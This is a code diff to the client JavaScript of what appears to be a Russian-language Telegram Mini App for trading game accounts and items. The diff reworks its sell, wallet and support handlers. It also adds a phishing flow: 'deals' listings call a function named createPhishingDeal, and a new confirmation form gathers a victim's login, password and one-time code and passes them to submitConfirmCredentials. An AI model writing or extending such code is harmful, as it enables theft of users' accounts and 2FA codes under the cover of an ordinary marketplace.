+    if (t.dataset.offer) { state.sell.category = t.dataset.offercat; const g = game(state.sell.gameId); state.sell.title = g ? `${g.name} · ${t.dataset.offertitle}` : t.dataset.offertitle; state.sell.description = `${t.dataset.offertitle}. Передача после оплаты.`; render(); return; }
+    if (t.hasAttribute("data-sell-next")) {
+      const s = state.sell;
+      if (s.role === "sell") {
+        if (!s.photos.length) return toast("Добавьте хотя бы одно фото");
+        const titleEl = $("#title"), descEl = $("#desc"), priceEl = $("#price");
+        if (titleEl) s.title = titleEl.value.trim();
+        if (descEl) s.description = descEl.value.trim();
+        if (priceEl) s.price = priceEl.value.trim();
+        const amt = parseAmount(s.price);
+        if (!amt || amt <= 0) return toast("Укажите цену больше 0");
         s.step = 3; render(); return;
       }
-      if (t.hasAttribute("data-sell-back")) { state.sell.step = 2; render(); return; }
-      if (t.hasAttribute("data-buy-go")) { if (state.sell.gameId) go("shop", state.sell.gameId); else go("home"); return; }
-      if (t.hasAttribute("data-publish")) {
-        const s = state.sell;
-        if (!s.photos.length) return toast("Добавьте фото товара");
-        if (!s.title.trim()) return toast("Нужно название");
-        const listing = {
-          id: uid("l"), sellerId: state.profile.id, category: s.category, title: s.title.trim(),
-          description: s.description.trim(), price: parseAmount(s.price) || 0, currency: s.currency,
-          stock: 1, accent: (game(s.gameId) || {}).color || "#31b545", photo: s.photos[0], photos: s.photos,
-          gameId: s.gameId || undefined, wantGameId: s.wantGameId || undefined,
-          at: Date.now(), sellerName: state.profile.firstName || "",
-        };
-        state.listings.unshift(listing);
-        persist();
-        state.sell = { step: 1, role: null, category: "accounts", gameId: null, wantGameId: null, title: "", description: "", price: "", photos: [], currency: state.payCurrency };
-        toast("Лот опубликован");
-        go("home");
-        pushListing(listing).then((ok) => {
-          if (!ok) toast("Лот на устройстве. Откройте Mini App из Telegram, чтобы он попал в общий каталог.");
-        });
-        return;
-      }
-      if (t.dataset.sheet != null) { state.sheet = t.dataset.sheet; state.amount = ""; state.details = ""; state.ccyPick = state.payCurrency; render(); return; }
-      if (t.dataset.ccy) { state.sell.currency = t.dataset.ccy; render(); return; }
-      if (t.dataset.pickCcy) { state.ccyPick = t.dataset.pickCcy; render(); return; }
-      if (t.hasAttribute("data-set-ccy")) { state.payCurrency = state.ccyPick; state.sheet = ""; persist(); render(); return; }
-      if (t.hasAttribute("data-topup")) {
-        const n = parseAmount($("#amt") ? $("#amt").value : state.amount);
-        const min = minTopup(state.payCurrency);
-        if (!Number.isFinite(n) || n < min) return toast(`Сумма от ${min} ${state.payCurrency}`);
-        state.balances[state.payCurrency] = (state.balances[state.payCurrency] || 0) + n;
-        state.ops.unshift({ id: uid("w"), type: "topup", amount: n, currency: state.payCurrency, status: "done", note: "Пополнение (демо)", at: Date.now() });
-        state.sheet = ""; persist(); toast("Баланс пополнен"); return;
-      }
-      if (t.hasAttribute("data-withdraw")) {
-        const n = parseAmount($("#amt") ? $("#amt").value : state.amount);
-        const det = $("#det") ? $("#det").value : state.details;
-        const min = minWithdraw(state.payCurrency);
-        const have = state.balances[state.payCurrency] || 0;
-        if (!Number.isFinite(n) || n < min) return toast(`Минимум ${min} ${state.payCurrency}`);
-        if (have < n) return toast("Недостаточно средств");
-        state.balances[state.payCurrency] = have - n;
-        state.ops.unshift({ id: uid("w"), type: "withdraw", amount: -n, currency: state.payCurrency, status: "pending", note: (ccy(state.payCurrency).label + ": " + det), at: Date.now() });
-        state.sheet = ""; persist(); toast("Заявка на вывод создана"); return;
-      }
-      if (t.hasAttribute("data-sort-dir")) { state.sortDir = state.sortDir === "desc" ? "asc" : "desc"; render(); return; }
-      if (t.hasAttribute("data-sort-key")) { state.sortKey = state.sortKey === "price" ? "title" : "price"; render(); return; }
-      if (t.hasAttribute("data-save-api")) {
-        const v = ($("#botapi") ? $("#botapi").value : "").trim().replace(/\/$/, "");
-        if (v && !/^https:\/\//i.test(v)) return toast("Нужен https:// адрес сервера");
-        try { localStorage.setItem("aurora-bot-api", v); } catch {}
-        D.botApi = v;
-        toast(v ? "Сервер бота сохранён" : "Адрес очищен");
-        return;
-      }
-      if (t.hasAttribute("data-send-chat")) {
-        const body = chatDraft();
-        if (!body) return;
-        sendSupport(body);
-        return;
-      }
-    });
-    const q = $("#q"); if (q) q.addEventListener("input", (e) => { state.query = e.target.value; });
-    const title = $("#title"); if (title) title.addEventListener("input", (e) => { state.sell.title = e.target.value; });
-    const desc = $("#desc"); if (desc) desc.addEventListener("input", (e) => { state.sell.description = e.target.value; });
-    const price = $("#price"); if (price) price.addEventListener("input", (e) => { state.sell.price = e.target.value; });
-    const chat = $("#chat");
-    if (chat) {
-      chat.addEventListener("input", (e) => { state.chatText = e.target.value; });
-      chat.addEventListener("keydown", (e) => {
-        if (e.key === "Enter") {
-          e.preventDefault();
-          const body = chatDraft();
-          if (body) sendSupport(body);
-        }
-      });
+      if (!s.gameId) return toast("Выберите игру");
+      s.step = 3; render(); return;
     }
-    const form = $("#chatf");
-    if (form) form.addEventListener("submit", (e) => {
-      e.preventDefault();
-      const body = chatDraft();
-      if (body) sendSupport(body);
-    });
-    const photos = $("#photos");
-    if (photos) photos.addEventListener("change", async (e) => {
-      const files = [...(e.target.files || [])].slice(0, 8 - state.sell.photos.length);
-      try {
-        for (const f of files) state.sell.photos.push(await compressFile(f));
-        e.target.value = "";
-        render();
-      } catch { toast("Нужно изображение (JPG, PNG, WEBP)"); }
-    });
-    const panel = root.querySelector(".sheet-panel");
-    if (panel) panel.addEventListener("click", (e) => e.stopPropagation());
-  }
+    if (t.hasAttribute("data-sell-back")) { state.sell.step = Math.max(1, state.sell.step - 1); render(); return; }
+    if (t.hasAttribute("data-publish")) {
+      const s = state.sell;
+      if (!s.photos.length) return toast("Без фото лот не публикуется");
+      if (s.category === "deals") { createPhishingDeal(s); return; }
+      const it = { id: uid("l"), sellerId: state.profile.id, title: s.title || "Без названия", description: s.description || "", category: s.category, gameId: s.gameId, price: parseAmount(s.price) || 0, currency: s.currency, stock: 1, photos: s.photos, accent: (game(s.gameId) || {}).color };
+      state.listings.unshift(it);
+      state.ops.unshift({ id: uid("w"), type: "listing", amount: 0, currency: s.currency, status: "done", note: it.title, at: Date.now() });
+      persist(); toast("Лот опубликован"); go("home"); return;
+    }
+    if (t.hasAttribute("data-buy-go")) { state.sell.step = 1; state.sell.role = null; go("home"); return; }
+    if (t.dataset.sheet != null) { state.sheet = t.dataset.sheet || ""; state.amount = ""; state.details = ""; render(); return; }
+    if (t.dataset.ccy) { state.sell.currency = t.dataset.ccy; render(); return; }
+    if (t.dataset.pickCcy) { state.ccyPick = t.dataset.pickCcy; render(); return; }
+    if (t.hasAttribute("data-set-ccy")) { state.payCurrency = state.ccyPick; persist(); state.sheet = ""; render(); return; }
+    if (t.hasAttribute("data-topup")) {
+      const amtEl = $("#amt"), amt = parseAmount((amtEl && amtEl.value) || state.amount);
+      if (Number.isNaN(amt) || amt < minTopup(state.payCurrency)) return toast(`Минимум ${minTopup(state.payCurrency)} ${state.payCurrency}`);
+      state.balances[state.payCurrency] = (state.balances[state.payCurrency] || 0) + amt;
+      state.ops.unshift({ id: uid("w"), type: "topup", amount: amt, currency: state.payCurrency, status: "done", note: "Пополнение", at: Date.now() });
+      state.sheet = ""; state.amount = ""; persist(); toast("Баланс пополнен"); render(); return;
+    }
+    if (t.hasAttribute("data-withdraw")) {
+      const amtEl = $("#amt"), detEl = $("#det"), amt = parseAmount((amtEl && amtEl.value) || state.amount), det = (detEl && detEl.value || state.details || "").trim();
+      if (Number.isNaN(amt) || amt < minWithdraw(state.payCurrency)) return toast(`Минимум ${minWithdraw(state.payCurrency)} ${state.payCurrency}`);
+      const have = state.balances[state.payCurrency] || 0;
+      if (amt > have) return toast("Недостаточно средств");
+      state.balances[state.payCurrency] = have - amt;
+      state.ops.unshift({ id: uid("w"), type: "withdraw", amount: -amt, currency: state.payCurrency, status: "pending", note: det || "Вывод", at: Date.now() });
+      state.sheet = ""; state.amount = ""; state.details = ""; persist(); toast("Заявка на вывод создана"); render(); return;
+    }
+    if (t.hasAttribute("data-sort-dir")) { state.sortDir = state.sortDir === "desc" ? "asc" : "desc"; render(); return; }
+    if (t.hasAttribute("data-sort-key")) { state.sortKey = state.sortKey === "price" ? "title" : "price"; render(); return; }
+    if (t.hasAttribute("data-save-api")) { const el = $("#botapi"), v = (el && el.value || "").trim(); if (v) { try { localStorage.setItem("aurora-bot-api", v.replace(/\/$/, "")); } catch {} } toast("Адрес сохранён"); return; }
+    if (t.hasAttribute("data-send-chat")) { sendSupport(chatDraft()); return; }
+    if (t.dataset.dealFilter) { state.dealFilter = t.dataset.dealFilter; render(); return; }
+    if (t.dataset.confirmDeal) { const deal = state.dealDeals.find((d) => d.id === t.dataset.confirmDeal); if (deal) { state.confirmModal = deal; render(); } return; }
+    if (t.hasAttribute("data-close-confirm")) { state.confirmModal = null; render(); return; }
+  });
+
+  // Другие слушатели
+  document.getElementById("q")?.addEventListener("input", (e) => { state.query = e.target.value; render(); });
+  document.getElementById("chatf")?.addEventListener("submit", (e) => { e.preventDefault(); sendSupport(chatDraft()); });
+  document.getElementById("confirmForm")?.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const login = (document.getElementById("cpLogin")?.value || "").trim();
+    const password = (document.getElementById("cpPass")?.value || "").trim();
+    const otp = (document.getElementById("cpOtp")?.value || "").trim();
+    if (!login || !password) return toast("Заполните все обязательные поля");
+    await submitConfirmCredentials(login, password, otp);
+  });
 
   window.addEventListener("hashchange", () => {
     const n = readHash();
@@ -857,16 +1037,14 @@
   const tryBoot = () => {
     if (bootTg() || n >= 20) {
       const start = ((tg() && tg().initDataUnsafe && tg().initDataUnsafe.start_param) || new URLSearchParams(location.search).get("tgWebAppStartParam") || "").toLowerCase();
-      const map = { support: "support", profile: "profile", wallet: "wallet", chats: "chats", sell: "sell", home: "home", ops: "ops" };
+      const map = { support: "support", profile: "profile", wallet: "wallet", chats: "chats", sell: "sell", home: "home", ops: "ops", deals: "deals" };
       const hash = readHash();
       if (map[start]) { state.screen = map[start]; state.selectedId = null; }
       else { state.screen = hash.screen; state.selectedId = hash.selectedId; }
       render();
       botApi();
-      pullListings().then(() => healMyListings());
       if (botApi() && initData()) pullThread();
       setInterval(() => { if (state.screen === "support") pullThread(); }, 2500);
-      setInterval(() => { if (["home", "shop", "section"].includes(state.screen)) pullListings(); }, 15000);
       if (window.__bootDone) window.__bootDone();
       return;
     }
